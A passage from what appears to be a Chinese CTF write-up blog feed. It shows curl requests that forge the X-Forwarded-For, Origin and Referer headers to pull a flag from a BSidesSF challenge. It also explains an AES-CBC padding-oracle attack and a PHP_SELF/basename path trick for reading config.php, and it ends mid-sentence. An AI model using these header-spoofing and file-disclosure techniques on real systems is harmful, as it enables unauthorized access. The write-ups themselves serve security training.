class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&quot;</span> -u <span class="string">&quot;player:54ef36ec71201fdf9d1423fd26f97f6b&quot;</span> -A <span class="string">&quot;1337 Browser v.9999&quot;</span> -H <span class="string">&quot;X-Forwarded-For:13.37.13.37,127.0.0.1&quot;</span> -b <span class="string">&quot;Fortune=6265&quot;</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, I expect you to accept only plain text media (MIME) type.</span></span><br></pre></td></tr></table></figure></div><p>只接受<code>纯文本（MIME）</code>形式的请求，依然通过 <code>-H</code> 参数添加请求头信息<code>Accept:text/plain</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&quot;</span> -u <span class="string">&quot;player:54ef36ec71201fdf9d1423fd26f97f6b&quot;</span> -A <span class="string">&quot;1337 Browser v.9999&quot;</span> -H <span class="string">&quot;X-Forwarded-For:13.37.13.37,127.0.0.1&quot;</span> -b <span class="string">&quot;Fortune=6265&quot;</span> -H <span class="string">&quot;Accept:text/plain&quot;</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, Я ожидал, что вы говорите по-русски.</span></span><br></pre></td></tr></table></figure></div><p>????<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303151227744.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303151227744.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&quot;</span> -u <span class="string">&quot;player:54ef36ec71201fdf9d1423fd26f97f6b&quot;</span> -A <span class="string">&quot;1337 Browser v.9999&quot;</span> -H <span class="string">&quot;X-Forwarded-For:13.37.13.37,127.0.0.1&quot;</span> -b <span class="string">&quot;Fortune=6265&quot;</span> -H <span class="string">&quot;Accept:text/plain&quot;</span> -H <span class="string">&quot;Accept-Language:ru&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># I&#x27;m sorry, I was expecting to share resources with the origin https://ctf.bsidessf.net</span></span><br></pre></td></tr></table></figure></div><p>添加 <code>origin:https://ctf.bsidessf.net</code> 和 <code>Referer:https://ctf.bsidessf.net/challenges</code></p><p>回显 <code>Congratulations!</code></p><p>最终 <code>payload</code> </p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&quot;</span> -u <span class="string">&quot;player:54ef36ec71201fdf9d1423fd26f97f6b&quot;</span> -A <span class="string">&quot;1337 Browser v.9999&quot;</span> -H <span class="string">&quot;X-Forwarded-For:13.37.13.37,127.0.0.1&quot;</span> -b <span class="string">&quot;Fortune=6265&quot;</span> -H <span class="string">&quot;Accept:text/plain&quot;</span> -H <span class="string">&quot;Accept-Language:ru&quot;</span> -H <span class="string">&quot;origin:https://ctf.bsidessf.net&quot;</span> -H <span class="string">&quot;Referer:https://ctf.bsidessf.net/challenges&quot;</span></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Ctf-Flag: flag&#123;5cb35f50-2c2f-4a9a-9001-10cd968b0347&#125;</span><br><span class="line">Date: Wed, 15 Mar 2023 04:33:29 GMT</span><br><span class="line">Content-Length: 16</span><br><span class="line">Content-Type: text/plain; charset=utf-8</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
    <summary type="html">凑DD想起了他的账号，重新开始摸了起来</summary>
    
    
    
    <category term="做题笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="writeup" scheme="https://manayakko.github.io/yakko117/tags/writeup/"/>
    
    <category term="ctf" scheme="https://manayakko.github.io/yakko117/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>BuuctfDay9</title>
    <link href="https://manayakko.github.io/yakko117/2022/01/03/buuctfDay09/"/>
    <id>https://manayakko.github.io/yakko117/2022/01/03/buuctfDay09/</id>
    <published>2022-01-03T04:15:43.394Z</published>
    <updated>2023-04-18T21:45:59.795Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>很久没更新了，因为各种原因摸了一年多的鱼</p><h1 id="NPUCTF2020-web🐕"><a href="#NPUCTF2020-web🐕" class="headerlink" title="[NPUCTF2020] web🐕"></a>[NPUCTF2020] web🐕</h1><p>首先先看一下题目</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">我摊牌了，就是懒得写前端</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);   <span class="comment"># $key,$flag</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;METHOD&quot;</span>, <span class="string">&quot;aes-128-cbc&quot;</span>);  <span class="comment">//定义加密方式</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;SECRET_KEY&quot;</span>, <span class="variable">$key</span>);    <span class="comment">//定义密钥</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;IV&quot;</span>,<span class="string">&quot;6666666666666666&quot;</span>);    <span class="comment">//定义初始向量 16个6</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;BR&quot;</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:./index.php?source=1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#var_dump($GLOBALS);   //听说你想看这个？</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_encrypt</span>(<span class="params"><span class="variable">$iv</span>,<span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;--------encrypt---------&quot;</span>.BR;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;IV:&#x27;</span>.<span class="variable">$iv</span>.BR;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>)).BR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_decrypt</span>(<span class="params"><span class="variable">$iv</span>,<span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,<span class="variable">$iv</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;False&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;method&#x27;</span>]==<span class="string">&#x27;encrypt&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$iv</span> = IV;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$flag</span>;    </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">aes_encrypt</span>(<span class="variable">$iv</span>,<span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;method&#x27;</span>]==<span class="string">&quot;decrypt&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$iv</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;iv&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">aes_decrypt</span>(<span class="variable">$iv</span>,<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;我摊牌了，就是懒得写前端&quot;</span>.BR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]==<span class="number">1</span>)<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h2><ul><li>PHP AES 加密</li><li>CBC字节翻转攻击 <a href="https://www.smi1e.top/cbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB%E5%92%8Cpadding-oracle/">微笑师傅的分析讲解</a> 以及 <a href="https://wooyun.js.org/drops/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-101Approach.html">wooyun的技术分析帖</a></li><li>还有这篇 <a href="https://www.freebuf.com/articles/web/15504.html">Padding Oracle攻击的分析和思考（详细）</a></li></ul><p>程序是 <code>128位的cbc</code>，<code>blocksize是16字节</code>，加密 <code>IV</code> 已知，<code>secret</code> 未知<br>但是可以知道解密是否成功，而且可以控制密文和解密的 <code>IV</code><br>可以使用 <code>padding oracle</code> 爆出明文</p><p>主要原理是根据 <code>cbc</code> 在 <code>IV padding</code> 正确的情况下的返回值和 <code>padding</code> 错误下的返回值是不一样的，可以利用这个特性逐位还原密文。</p><p>找到个<a href="https://github.com/mpgn/Padding-oracle-attack">脚本</a></p><p><a href="https://github.com/sqxssss/NPUCTF_WriteUps/blob/master/npuctf_wp_by_star.md">https://github.com/sqxssss/NPUCTF_WriteUps/blob/master/npuctf_wp_by_star.md</a></p><p><a href="http://wh1sper.cn/padding-oracle-attackcbc%e5%ad%97%e8%8a%82%e7%bf%bb%e8%bd%ac%e6%94%bb%e5%87%bb/">http://wh1sper.cn/padding-oracle-attackcbc%e5%ad%97%e8%8a%82%e7%bf%bb%e8%bd%ac%e6%94%bb%e5%87%bb/</a></p><p><a href="https://www.jianshu.com/p/7f171477a603">https://www.jianshu.com/p/7f171477a603</a></p><hr><h1 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="主要说一下几个关键点"><a href="#主要说一下几个关键点" class="headerlink" title="主要说一下几个关键点"></a>主要说一下几个关键点</h2><p><a href="https://www.php.net/manual/zh/function.hash-equals.php">hash_equals 函数</a><br><a href="https://www.php.net/manual/zh/function.crypt.php">crypt 加密函数</a></p><p>在密码学中，时序攻击是一种侧信道攻击，攻击者试图通过分析加密算法的时间执行来推导出密码。每一个逻辑运算在计算机需要时间来执行，根据输入不同，精确测量执行时间，根据执行时间反推出密码。</p><p>如果是用普通的 <code>==</code> 来进行比较，那么两个字符串是从第一位开始逐一进行比较的，发现不同就立即返回 <code>false</code>，那么通过计算返回的速度就知道了大概是哪一位开始不同的，<code>php</code> 中为了应对这种情况，就使用 <code>hash_equals函数</code>。</p><p>示例如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>  = <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;114514&#x27;</span>, <span class="string">&#x27;$2a$07$stringforsalt$&#x27;</span>);</span><br><span class="line"><span class="variable">$AAA</span>   = <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;114514&#x27;</span>, <span class="string">&#x27;$2a$07$stringforsalt$&#x27;</span>);</span><br><span class="line"><span class="variable">$BBB</span> = <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;manako&#x27;</span>, <span class="string">&#x27;$2a$07$stringforsalt$&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$test</span>, <span class="variable">$AAA</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$test</span>, <span class="variable">$BBB</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>回显</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span>(<span class="literal">true</span>)</span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">true</span>)</span><br></pre></td></tr></table></figure></div><p>而将盐值修改为要求的散列类 <code>$2a$07$usesomesillystringforsalt$</code><br>或者去掉bool变量定义，直接将盐值变成 <code>stringforsalt</code> 返回会判定为 <code>false</code></p><p>同时看到一句这样的话:</p><blockquote><p>When the failure string “*0” is given as the salt, “*1” will now be returned for consistency with other crypt implementations. Prior to this version, PHP 5.6 would incorrectly return a DES hash.</p></blockquote><p>首先来看一下这个加密算法<br><code>crypt</code> 有两个参数：<br>第一个参数：加密字符串<br>第二个参数：盐值字符串 <code>/$str = &#39;123456789&#39;</code>;<br>使用自动盐值 <code>echo&#39;自动 盐值: &#39; . crypt($str) . &quot;\n&quot;; </code><br>如 <code>$1$yvnZHBo0$sBZBd0vzZYnxbtQftQulZ</code></p><hr><h2 id="以不同散列类型使用-crypt"><a href="#以不同散列类型使用-crypt" class="headerlink" title="以不同散列类型使用 crypt()"></a>以不同散列类型使用 crypt()</h2><h3 id="CRYPT-STD-DES-基于标准-DES-算法的散列使用"><a href="#CRYPT-STD-DES-基于标准-DES-算法的散列使用" class="headerlink" title="CRYPT_STD_DES - 基于标准 DES 算法的散列使用"></a>CRYPT_STD_DES - 基于标准 DES 算法的散列使用</h3><p><code>./0-9A-Za-z</code> 字符中的两个字符作为盐值。<br>在盐值中使用非法的字符将导致 <code>crypt()</code> 失败。</p><h3 id="CRYPT-EXT-DES-扩展的基于-DES-算法的散列。"><a href="#CRYPT-EXT-DES-扩展的基于-DES-算法的散列。" class="headerlink" title="CRYPT_EXT_DES - 扩展的基于 DES 算法的散列。"></a>CRYPT_EXT_DES - 扩展的基于 DES 算法的散列。</h3><p>其盐值为 <code>9</code> 个字符的字符串，由 <code>1</code> 个下划线后面跟着 <code>4</code> 字节循环次数和 <code>4</code> 字节盐值组成。<br>它们被编码成可打印字符，每个字符 <code>6</code> 位，有效位最少的优先。<br><code>0</code> 到 <code>63</code> 被编码为 <code>./0-9A-Za-z</code>。</p><h3 id="CRYPT-MD5-MD5-散列"><a href="#CRYPT-MD5-MD5-散列" class="headerlink" title="CRYPT_MD5 - MD5 散列"></a>CRYPT_MD5 - MD5 散列</h3><p>使用一个以 <code>$1$</code> 开始的 <code>12</code> 字符的字符串盐值。</p><h3 id="CRYPT-BLOWFISH-Blowfish-算法"><a href="#CRYPT-BLOWFISH-Blowfish-算法" class="headerlink" title="CRYPT_BLOWFISH - Blowfish 算法"></a>CRYPT_BLOWFISH - Blowfish 算法</h3><p>使用如下盐值：<code>$2a$</code>，一个两位 <code>cost</code> 参数，<code>$</code> 以及 <code>64</code> 位由 <code>./0-9A-Za-z</code> 中的字符组合而成的字符串。<br>在盐值中使用此范围之外的字符将导致 <code>crypt()</code> 返回一个空字符串。<br>两位 <code>cost</code> 参数是循环次数以 <code>2</code> 为底的对数，它的范围是 <code>04-31</code>，超出这个范围将导致 <code>crypt()</code> 失败。</p><p><font color="red">！！！需要注意到一点</font>，盐值要求为 <code>64位</code>，长度不满足就会加密失败，这就是为什么上面的示例使用<code>$2a$07$stringforsalt$</code> 会出现 <code>hash</code> 验证为 <code>true</code>;</p><h3 id="CRYPT-SHA256-x2F-SHA512-散列算法"><a href="#CRYPT-SHA256-x2F-SHA512-散列算法" class="headerlink" title="CRYPT_SHA256&#x2F;SHA512 散列算法"></a>CRYPT_SHA256&#x2F;SHA512 散列算法</h3><p><code>SHA-256</code> 算法使用一个以 <code>$5$</code> 开头的 <code>16</code> 字符字符串盐值进行散列<br>如果盐值字符串以 <code>rounds=$</code> 开头，<code>N</code> 的数字值将被用来指定散列循环的执行次数，这点很像 Blowfish 算法的 <code>cost</code> 参数。默认的循环次数是 <code>5000</code>，最小是 <code>1000</code>，最大是 <code>999,999,999</code>。超出这个范围的 <code>N</code> 将会被转换为最接近的值。</p><p><code>SHA-256</code> 和 <code>SHA-512</code> 同理</p><p>加密示例</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (CRYPT_STD_DES == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Standard DES: &#x27;</span> . <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;rasmuslerdorf&#x27;</span>, <span class="string">&#x27;rl&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_EXT_DES == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Extended DES: &#x27;</span> . <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;rasmuslerdorf&#x27;</span>, <span class="string">&#x27;_J9..rasm&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_MD5 == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;MD5:          &#x27;</span> . <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;rasmuslerdorf&#x27;</span>, <span class="string">&#x27;$1$rasmusle$&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_BLOWFISH == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Blowfish:     &#x27;</span> . <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;rasmuslerdorf&#x27;</span>, <span class="string">&#x27;$2a$07$usesomesillystringforsalt$&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_SHA256 == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;SHA-256:      &#x27;</span> . <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;rasmuslerdorf&#x27;</span>, <span class="string">&#x27;$5$rounds=5000$usesomesillystringforsalt$&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_SHA512 == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;SHA-512:      &#x27;</span> . <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;rasmuslerdorf&#x27;</span>, <span class="string">&#x27;$6$rounds=5000$usesomesillystringforsalt$&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><hr><h2 id="回归到解题本身"><a href="#回归到解题本身" class="headerlink" title="回归到解题本身"></a>回归到解题本身</h2><h3 id="思路1"><a href="#思路1" class="headerlink" title="思路1"></a>思路1</h3><p>比较两个提交的参数是否相等，则给出flag，<code>random_bytes</code>函数生成适合于加密使用的任意长度的加密随机字节字符串，随后通过<code>bin2hex</code>转换为十六进制值</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>)) .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//需要将PHP version 更改为&gt;=7</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>)) .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>)) .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>)) .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h3><p>绕过正则表达式访问开头源码提示flag的config.php</p><p>需要了解的几个东西 <a href="https://www.php.net/basename">basename函数</a> 以及 <a href="https://bugs.php.net/bug.php?id=62119">函数漏洞</a><br><a href="https://blog.csdn.net/weixin_42314192/article/details/116257437">参考思路，PHP里的basename函数不支持中文名的解决</a></p><p>首先先看全局变量 <code>$_SERVER[‘PHP_SELF’]</code> </p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[‘PHP_SELF’] 获取当前页面地址</span><br><span class="line">是当前 php 文件相对于网站根目录的位置地址</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//www.test.com/php/ | /php/index.php</span></span><br><span class="line">http:<span class="comment">//www.test.com/php/index.php | /php/index.php</span></span><br><span class="line">http:<span class="comment">//www.test.com/php/index.php?test=yakko | /php/index.php</span></span><br><span class="line">http:<span class="comment">//www.test.com/php/index.php/test/yakko | /php/index.php/test/yakko</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_SERVER</span>[‘REQUEST_URI’]完整url地址，包括请求的url参数</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SERVER</span>[‘HTTP_HOST’]只有一段的域名,不包括前面的协议和后面的相对位置</span><br></pre></td></tr></table></figure></div><p>访问 <code>/index.php/config.php</code>，经过 <code>basename()</code> 传入 <code>highlight_file()</code> 的文件名就会变成 